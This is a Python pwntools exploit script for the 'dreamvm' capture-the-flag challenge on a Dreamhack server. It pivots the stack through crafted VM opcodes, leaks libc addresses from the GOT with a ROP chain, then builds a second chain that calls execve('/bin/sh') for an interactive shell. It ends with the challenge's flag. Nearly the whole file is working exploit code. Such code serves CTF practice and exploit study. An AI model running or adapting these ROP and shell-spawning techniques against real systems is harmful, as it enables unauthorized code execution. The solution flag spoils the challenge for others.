#!/usr/bin/env python3

from pwn import *

exe = ELF('./dreamvm_patched')
libc = ELF('./libc6_2.31-0ubuntu9.18_amd64.so')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

script = '''
# read code
b *0x4005F5
# execute code
b *0x40062B
# return
b *main+391
'''

p = remote("host8.dreamhack.games", 15696)
#p = process('./dreamvm_patched')
#p = gdb.debug('./dreamvm_patched', gdbscript = script)
#debug()

pop_rdi = 0x0000000000400903
pop_rsi_r15 = 0x0000000000400901
pop_rdx_4tmp = 0x0000000000400854
pop_rsp = 0x0000000000400721
write_all = 0x40085C

# stack pivot at first, leak later
payload = b""
payload += p8(4) + p64(0x40) # change memory ptr
payload += p8(6) + p8(1) # because the memory_ptr auto -8 whenever load
payload += p8(6) + p8(1)
payload = payload.ljust(0x50, b"A")
# real ROP begin from here
payload += p64(pop_rdi) + p64(exe.got['write']) + p64(write_all)
payload += p64(pop_rdi) + p64(exe.got['close']) + p64(write_all)
payload += p64(pop_rdi) + p64(exe.got['abort']) + p64(write_all)
# read again, ret2libc
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(0x6010d8 + 0x60) + p64(0) # prepare the rsi so it execute rop right after read
payload += p64(pop_rdx_4tmp) + p64(0x1000) + p64(0) * 4
payload += p64(exe.plt['read'])

payload = payload.ljust(0x100, b"B")
s(payload)

s(p64(0x601090))
s(p64(pop_rsp))

# leak from server
# https://libc.blukat.me/?q=write%3A280%2Cclose%3Aa20%2Cabort%3A72e&l=libc6_2.31-0ubuntu9.18_amd64
write = u64(p.recv(8))
close = u64(p.recv(8))
abort = u64(p.recv(8))
lleak("write", write)
lleak("close", close)
lleak("abort", abort)
libc_base = write - libc.symbols['write']
lleak("libc_base", libc_base)
binsh = libc_base + list(libc.search(b"/bin/sh\x00"))[0]
pop_rax = libc_base + 0x0000000000036174
syscall = libc_base + 0x000000000002284d

payload = p64(pop_rdi) + p64(binsh)
payload +=p64(pop_rsi_r15) + p64(0) * 2
payload += p64(pop_rdx_4tmp) + p64(0) * 5
payload += p64(pop_rax) + p64(59)
payload += p64(syscall)
s(payload)

p.interactive()
#DH{h4ha-mi541gned-5t4ck-po1n7er-g0-brrrrrrrrr}